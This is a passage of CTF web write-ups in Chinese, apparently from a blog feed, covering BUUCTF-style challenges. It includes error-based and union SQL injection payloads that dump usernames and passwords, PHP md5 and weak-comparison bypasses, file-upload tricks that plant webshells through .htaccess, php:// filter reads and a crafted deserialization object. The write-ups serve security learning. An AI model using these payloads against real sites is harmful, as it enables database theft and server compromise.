class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>获取当前数据库下数据表信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>获取users表名的列名信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+<br></code></pre></td></tr></table></figure><p>获取users数据表下username、password两列名的用户字段信息:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+<br><br>?id=1&quot; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">3</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><strong>extractvalue()函数语法:extractvalue(XML_document,XPath_string)</strong></p><p>同上理</p><p>获取当前是数据库名称及使用mysql数据库的版本信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+<br></code></pre></td></tr></table></figure><p>获取当前位置所用数据库的位置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+<br></code></pre></td></tr></table></figure><p>获取表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>获取users表的列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>获取对应的列名的信息(username&#x2F;password):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+<br></code></pre></td></tr></table></figure><p>尝试之后，发现本题就能利用这两个函数进行报错注入</p><p>构造payload：查找数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database()),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135244580.png" alt="image-20240212135244580"></p><p>查找表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="hljs-string">&#x27;))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135344562.png" alt="image-20240212135344562"></p><p>查列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135428321.png" alt="image-20240212135428321"></p><p>根据之前的经验，flag应该就在password里，直接爆数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(0,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p>不放心也可以都看看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#x27;</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;,username,&#x27;</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;,password))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212135822226.png" alt="image-20240212135822226"></p><p>这里是因为updataxml只能显示32位字符</p><p>sql中的right函数右到左，也就是输出右边的，left函数是从左边到右边就是输出左边的</p><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))),1))#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/12/WebWriteUp5/image-20240212140151781.png" alt="image-20240212140151781"></p><p>最后将两段拼起来并去掉重复的部分：</p><p>flag{0738fa38-907b-4661-a4b0-fc6c78dae589}</p><h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240213192437978.png" alt="image-20240213192437978"></p><p>一进来是这么一段话</p><p>还原后大概是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you <br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>; <br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123; <span class="hljs-comment">// 传入两个GET,gg和id</span><br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]; <br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>]; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span class="hljs-comment">// 经过md5后两个值,全等，且传入的值不相同</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123; <span class="hljs-comment">// 传入POST,passwd</span><br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]; <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>)) &#123; <span class="hljs-comment">// passwd不能为数字</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>) &#123; <span class="hljs-comment">// passwd必须要和1234567对等</span><br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>; <br>                    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>); <br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>); <br>                &#125; <span class="hljs-keyword">else</span> &#123; <br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>; <br>                    &#125; <br>            &#125; <span class="hljs-keyword">else</span>&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>; <br>                &#125; <br>        &#125; <span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>); <br>            &#125; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>; <br>        &#125; <br>&#125; <span class="hljs-keyword">else</span>&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>); <br>    &#125;<br><span class="hljs-meta">?&gt;</span><br>Please input first<br></code></pre></td></tr></table></figure><ol><li><code>include &#39;flag.php&#39;;</code>：引入 <code>flag.php</code> 文件，其中包含了一个变量 <code>$flag</code></li><li><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</code>：检查是否存在名为 <code>gg</code> 和 <code>id</code> 的 GET 参数。</li><li><code>$id=$_GET[&#39;id&#39;]; $gg=$_GET[&#39;gg&#39;];</code>：将 <code>id</code> 和 <code>gg</code> 的 GET 参数的值分别赋给 <code>$id</code> 和 <code>$gg</code> 变量。</li><li><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</code>：比较 <code>id</code> 和 <code>gg</code> 经过 MD5 哈希后的值是否相等，且它们本身不相等。这是为了确保输入的两个值不同。</li><li><code>echo &#39;You got the first step&#39;;</code>：如果上述条件成立，输出提示信息。</li><li><code>if(isset($_POST[&#39;passwd&#39;])) &#123;</code>：检查是否存在名为 <code>passwd</code> 的 POST 参数。</li><li><code>$passwd=$_POST[&#39;passwd&#39;];</code>：将 <code>passwd</code> 的 POST 参数的值赋给 <code>$passwd</code> 变量。</li><li><code>if (!is_numeric($passwd)) &#123;</code>：检查 <code>$passwd</code> 是否为数字。</li><li><code>if($passwd==1234567) &#123;</code>：如果 <code>$passwd</code> 的值等于 <code>1234567</code>，输出成功信息，包括 flag 文件的内容，并结束程序。</li><li><code>else &#123; echo &quot;can you think twice??&quot;; &#125;</code>：如果密码不等于 <code>1234567</code>，输出提示信息。</li><li><code>&#125; else&#123; echo &#39;You can not get it !&#39;; &#125;</code>：如果密码是数字，输出提示信息。</li><li><code>&#125; else&#123; die(&#39;only one way to get the flag&#39;); &#125;</code>：如果没有找到 <code>passwd</code> 参数，输出提示信息，然后结束程序。</li><li><code>&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;</code>：如果 <code>id</code> 和 <code>gg</code> 的值不满足条件，输出提示信息。</li><li><code>&#125; else&#123; die(&#39;Please input first&#39;); &#125;</code>：如果没有找到 <code>gg</code> 和 <code>id</code> 参数，输出提示信息，然后结束程序</li></ol><p>这里很显然可以利用之前学到的绕过md5比较的方式绕过id和gg的比较，通过弱类型比较来绕过password的判断</p><p>所以利用Hackbar，得到flag</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213193310068.png" alt="image-20240213193310068"></p><h3 id="babyUpload"><a href="#babyUpload" class="headerlink" title="babyUpload"></a>babyUpload</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240213194207026.png" alt="image-20240213194207026"></p><p>一个常见的界面，随便上传一个看看，上传了一个webshell.php，得到如下界面：</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194340429.png" alt="image-20240213194340429"></p><p>老规矩，开始抓包</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194637057.png" alt="image-20240213194637057"></p><p>加.绕过，提示类型，修改成jpeg</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194722710.png" alt="image-20240213194722710"></p><p>感觉又要使用.htaccess文件了</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213194940758.png" alt="image-20240213194940758"></p><p>修改类型之后成功上传，上传一个webshell.jpg文件，但依然无法通过，看起来是检测了内容</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213195059910.png" alt="image-20240213195059910"></p><p>利用script+php绕过试试</p><p><img src="/2024/02/12/WebWriteUp5/image-20240213195723114.png" alt="image-20240213195723114"></p><p>成功上传</p><p>用蚁剑连接，根目录下找到flag</p><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240214211342565.png" alt="image-20240214211342565"></p><p>随便输入，尝试，提示错误的用户名</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214211509277.png" alt="image-20240214211509277"></p><p>将用户名改成1‘ or 1&#x3D;1后</p><p>提示：</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214211555307.png" alt="image-20240214211555307"></p><p>那注入点应该是在用户名这，同时只显示了wrong user，没报密码的错，有可能是密码会通过某种方法被加密，那么试一下万能钥匙：admin’ or ‘1’&#x3D;‘1’#</p><p>那么再判断字段数，当payload为：admin’ union select 1,2,3,4#时，回显：</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214212009506.png" alt="image-20240214212009506"></p><p>但前三个都回显wrong user，说明有三个字段，但为admin’ union select 1,2,3#时</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214214019377.png" alt="image-20240214214019377"></p><p>回显为wrong pass，说明里边admin为一个有效数据，那么尝试admin的位置（其实这里猜也能猜到在第二个，所以直接放第二个尝试）：admin’ union select 1,’admin’,3#</p><p>回显为Wrong pass，说明就是admin在第二个</p><blockquote><p>新知识点：</p><p>Mysql在查询不存在的数据时，会自动构建虚拟数据，存储方式要么为明文，要么为某种加密（通常为md5）</p></blockquote><p>原理：</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214220412035.png" alt="image-20240214220412035"></p><p>所以，这里已知admin为合法用户名，那么就构建一个不合法的用户名</p><p>构造payload：</p><p>用户名：1’ union select 1,‘admin’,’202cb962ac59075b964b07152d234b70’</p><p>密码：123</p><p>202cb962ac59075b964b07152d234b70为123的md5计算结果，得到flag</p><p><img src="/2024/02/12/WebWriteUp5/image-20240214215313815.png" alt="image-20240214215313815"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp4</title>
    <link href="/2024/02/04/WebWriteUp4/"/>
    <url>/2024/02/04/WebWriteUp4/</url>
    
    <content type="html"><![CDATA[<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240204214102827.png" alt="image-20240204214102827"></p><p>进来是之前见过的一个界面，那再查看源码看看</p><p>在MENU这个元素这里看到了pay.php，结合题目名称，点进去看看</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204214505526.png" alt="image-20240204214505526"></p><p>首先，题目要求要是Cuit’s students，涉及到身份验证，查看网页的cookie</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220534659.png" alt="image-20240204220534659"></p><p>将user修改成1</p><p>网页变成了：</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220710021.png" alt="image-20240204220710021"></p><p>查看源码：</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204214600079.png" alt="image-20240204214600079"></p><p>通过post方式传参，验证password是否为404，但数字又被过滤掉了。观察源码，验证password时使用的是弱类型比较，所以，可以通过例如404abc绕过。</p><p>同时页面提示还需要传100000000钱</p><p>构造payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">password</span>=404a &amp; <span class="hljs-attribute">money</span>=100000000<br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240204220846562.png" alt="image-20240204220846562"></p><p><strong>方法一</strong></p><p>数字太长，尝试科学计数法</p><p><img src="/2024/02/04/WebWriteUp4/image-20240204220949342.png" alt="image-20240204220949342"></p><p>得到flag</p><p><strong>方法二</strong></p><p>使用数组进行传参，跳过判断</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">password</span>=<span class="hljs-number">404</span>a &amp; money[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="EasyMD5"><a href="#EasyMD5" class="headerlink" title="EasyMD5"></a>EasyMD5</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240205203520961.png" alt="image-20240205203520961"></p><p>尝试了各种sql注入字符串均没异常</p><p>那么抓包看看：</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205204003253.png" alt="image-20240205204003253"></p><p>看到hint： select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>md5函数用法：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">md5(<span class="hljs-type">string</span>,raw)<br><br><span class="hljs-symbol">string:</span>需要计算的字符串<br><span class="hljs-symbol">raw:</span> <span class="hljs-literal">true</span>: <span class="hljs-number">16</span>字符二进制格式<br> <span class="hljs-literal">false</span>: <span class="hljs-number">32</span>字符十六进制格式<br></code></pre></td></tr></table></figure><p>所以这里需要进行sql注入的话，需要利用mysql一个特性：</p><blockquote><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。<br>要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true</p></blockquote><p>那么就需要一个字符，在计算完该字符的md5值后，经过hex能转成 ‘xxx’ or ‘xxxx’ 格式，通过后边的字符串由数字开头，就能将原select语句变成永真式</p><p>这里了解到一个常用字符串：ffifdyop</p><p>后端语句就会变成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">select * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;6xxxxxxx&#x27;</span><br></code></pre></td></tr></table></figure><p>所以这里输入ffifdyop，得到：</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205205537445.png" alt="image-20240205205537445"></p><p>看来还要继续注入</p><p>查看源码：</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205205610457.png" alt="image-20240205205610457"></p><p>这里应该就是让我们找一对md5碰撞，但可以看到，依旧是弱类型比较，所以其实a，b只要满足其md5值的形式是例如1xxxxx，就行。</p><p>提供一对字符：QNKCDZO和s214587387a，通过get方法传参即可</p><p><img src="/2024/02/04/WebWriteUp4/image-20240205210043709.png" alt="image-20240205210043709"></p><p>这回不是弱类型比较了，但可以利用数组绕过，因为：md5(array()) &#x3D; null</p><blockquote><p>补充：</p><p>strcmp(array(), “abc”) &#x3D; null<br>strpos(array(),”abc”) &#x3D; null</p></blockquote><p><img src="/2024/02/04/WebWriteUp4/image-20240205210252841.png" alt="image-20240205210252841"></p><p>即可得到flag</p><h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240208204615216.png" alt="image-20240208204615216"></p><p>进来是一个充满了抽象元素的界面</p><p>随便上传一个一句话木马webshell.php，得到如下界面</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208204826660.png" alt="image-20240208204826660"></p><p>抓包看看，看着界面上已经有的两个图片都是jpg，改变content-type试试</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205237527.png" alt="image-20240208205237527"></p><p>应该对后缀php还有检测，尝试一些方法也无法绕过</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205403054.png" alt="image-20240208205403054"></p><p>使用php.后缀，绕过成功</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208205503847.png" alt="image-20240208205503847"></p><p>但用蚁剑连接不上，应该是一句话木马确实上传到了后端，但没被解析，所以在连接的时候显示连接是空，这里再选择用上传.htaccess文件绕过</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208211735266.png" alt="image-20240208211735266"></p><p><img src="/2024/02/04/WebWriteUp4/image-20240208211707475.png" alt="image-20240208211707475"></p><p>在根目录找到flag</p><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240208212850364.png" alt="image-20240208212850364"></p><p>flag.txt:</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208212917440.png" alt="image-20240208212917440"></p><p>welcome.txt</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213509159.png" alt="image-20240208213509159"></p><p>hints.txt</p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213530444.png" alt="image-20240208213530444"></p><p><img src="/2024/02/04/WebWriteUp4/image-20240208213639476.png" alt="image-20240208213639476"></p><p>这里可以看到这里是计算了filename的hash值，才能访问</p><h3 id="NiZhuanSiWei"><a href="#NiZhuanSiWei" class="headerlink" title="NiZhuanSiWei"></a>NiZhuanSiWei</h3><p><img src="/2024/02/04/WebWriteUp4/image-20240209184425988.png" alt="image-20240209184425988"></p><p>需要通过GET方式传入，text,file,password</p><p>isset的作用是检测变量是否已设置并且非null</p><p>file_get_contents的作用是将整个文件读入一个字符串</p><p>将text文件中读取字符串，还要和welcome to the zjctf相等</p><p>使用的是data:&#x2F;&#x2F;写入协议</p><p>所以构造第一个payload：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure><p><img src="/2024/02/04/WebWriteUp4/image-20240209184828696.png" alt="image-20240209184828696"></p><p>成功回显</p><p>观察到源码中包含了一个useless.php文件，尝试使用php伪协议读取文件，构造payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>: 使用 <code>data://</code> 协议，表示接下来的内容是数据而不是文件路径，<code>text/plain;base64,</code> 表示数据是以 Base64 编码的纯文本。解码后的文本是 “welcome to the zjctf”。</p><p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>: 使用 <code>php://filter</code> 协议，它允许对资源应用过滤器。<code>read=convert.base64-encode/resource=</code> 表示读取 <code>useless.php</code> 文件并将其内容通过 Base64 编码进行输出。</p><p><img src="/2024/02/04/WebWriteUp4/image-20240209185545155.png" alt="image-20240209185545155"></p><p>将得到的内容进行解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>这里使用了一个魔术方法：</p><p>如果 <code>$file</code> 属性被设置，<code>__toString</code> 方法将读取文件内容并输出。</p><p>再看这一段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//useless.php     </span><br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);     <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;  <br></code></pre></td></tr></table></figure><p>涉及到序列化与反序列化，所以根据之前做的反序列化的题（参考WebWriteUp3）</p><p>构造一个序列化对象，让其能通过反序列化的方法读取flag.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img 